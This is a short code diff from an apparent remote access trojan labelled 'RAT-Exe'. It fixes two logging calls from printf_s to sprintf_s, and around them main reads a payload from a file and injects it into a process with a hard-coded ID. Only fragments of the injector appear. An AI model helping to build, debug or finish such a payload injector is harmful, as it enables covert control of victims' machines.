@@ -28,7 +28,7 @@ INT main()
     status = readPayload(filePath, &fileSize, &fileBytes);
     if (status != ERROR_SUCCESS)
     {
-        printf_s(msgBuf, "RAT-Exe::main - Failure from readPayload %d\n", status);
+        sprintf_s(msgBuf, "RAT-Exe::main - Failure from readPayload %d\n", status);
         OutputDebugStringA(msgBuf);
         goto cleanup;
     }
@@ -40,7 +40,7 @@ INT main()
     status = inject(2592, fileSize, fileBytes);
     if (status != ERROR_SUCCESS)
     {
-        printf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
+        sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
         OutputDebugStringA(msgBuf);
         goto cleanup;
     }
